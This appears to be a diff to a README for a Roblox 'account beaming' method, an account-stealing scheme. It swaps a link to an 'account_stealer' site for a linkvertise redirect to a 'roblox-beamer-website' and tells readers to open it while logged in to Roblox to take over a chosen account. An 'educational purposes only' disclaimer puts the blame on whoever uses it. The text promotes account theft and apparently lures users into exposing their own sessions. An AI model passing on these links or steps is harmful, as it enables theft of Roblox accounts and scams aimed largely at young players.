@@ -8,7 +8,7 @@ its very easy and might get patched soon
 
 WARNING: this is for educational purposes only, the damage that you cause to other accounts is not my fault, so if you get banned, its your fault, not mine
 
-to start open the website that i created: https://rblxcopy.net/account_stealer/account_stealer/
+to start open the linkvertise that redirects you to the website that i created: https://direct-link.net/486541/roblox-beamer-website
 
 and in a new tab open roblox and find the account you want to beam (you have to be logged in to roblox to beam the account(s))
 
